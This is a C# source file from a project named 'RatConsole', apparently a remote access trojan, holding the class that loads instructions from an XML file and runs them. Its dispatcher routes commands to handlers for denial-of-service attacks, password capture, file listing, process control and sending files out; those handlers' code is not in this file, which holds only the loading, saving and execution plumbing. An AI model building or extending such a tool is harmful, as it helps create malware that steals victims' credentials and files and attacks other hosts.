using System;
using System.Linq;
using System.Collections.Generic;

using Bau.Libraries.LibCommonHelper.Extensors;
using Bau.Libraries.LibMarkupLanguage;

namespace RatConsole.Domain
{
	/// <summary>
	///		Colección de instrucciones
	/// </summary>
	internal class InstructionsModel : List<BaseInstructionModel>
	{
		// Variables privadas
		private const string TagRoot = "Instructions";

		internal InstructionsModel(Controllers.ProgramManager manager)
		{
			Manager = manager;
		}

		/// <summary>
		///		Carga una serie de instrucciones
		/// </summary>
		internal void Load(string fileName)
		{
			if (System.IO.File.Exists(fileName))
				try
				{
					MLFile fileML = new Bau.Libraries.LibMarkupLanguage.Services.XML.XMLParser().Load(fileName);

						if (fileML != null)
							foreach (MLNode rootML in fileML.Nodes)
								if (rootML.Name == TagRoot)
									foreach (MLNode nodeML in rootML.Nodes)
									{
										BaseInstructionModel instruction = null;

											// Interpreta el nodo
											switch (nodeML.Name)
											{ 
												case DoSAttackInstructionModel.TagRoot:
														instruction = new DoSAttackInstructionModel(Manager).Parse(nodeML);
													break;
												case CapturePasswordsInstructionModel.TagRoot:
														instruction = new CapturePasswordsInstructionModel(Manager).Parse(nodeML);
													break;
												case ListFilesInstructionModel.TagRoot:
														instruction = new ListFilesInstructionModel(Manager).Parse(nodeML);
													break;
												case ProcessInstructionModel.TagRoot:
														instruction = new ProcessInstructionModel(Manager).Parse(nodeML);
													break;
												case SendFilesInstructionModel.TagRoot:
														instruction = new SendFilesInstructionModel(Manager).Parse(nodeML);
													break;
											}
											// Si no existía ya, la añade
											if (!Exists(instruction.Id))
												Add(instruction);
									}
				}
				catch {}
		}

		/// <summary>
		///		Comprueba si existe un Id de instrucción en la colección
		/// </summary>
		private bool Exists(string id)
		{
			return this.FirstOrDefault(item => item.Id.EqualsIgnoreCase(id)) != null;
		}

		/// <summary>
		///		Graba las instrucciones
		/// </summary>
		internal void Save(string fileName)
		{
			MLFile fileML = new MLFile();
			MLNode rootML = fileML.Nodes.Add(TagRoot);

				// Añade las instrucciones
				foreach (BaseInstructionModel instruction in this)
					rootML.Nodes.Add(instruction.GetMLNode());
				// Graba el archivo
				try
				{
					Bau.Libraries.LibCommonHelper.Files.HelperFiles.MakePath(System.IO.Path.GetDirectoryName(fileName));
					new Bau.Libraries.LibMarkupLanguage.Services.XML.XMLWriter().Save(fileName, fileML);
				}
				catch {}
		}

		/// <summary>
		///		Ejecuta las instrucciones
		/// </summary>
		internal void Execute()
		{
			// Log
			Manager.Log("Inicio de ejecución de instrucciones ...");
			// Ejecuta las instrucciones
			foreach (BaseInstructionModel instruction in this)
				if (instruction.MustExecute())
					instruction.Execute();
			// Log
			Manager.Log("Fin de ejecución de instrucciones ...");
		}

		/// <summary>
		///		Borra las instrucciones ejecutadas
		/// </summary>
		internal void DeleteExecuted()
		{
			for (int index = Count - 1; index >= 0; index--)
				if (this[index].CanDelete())
					RemoveAt(index);
		}

		/// <summary>
		///		Manager de ejecución
		/// </summary>
		private Controllers.ProgramManager Manager { get; }
	}
}
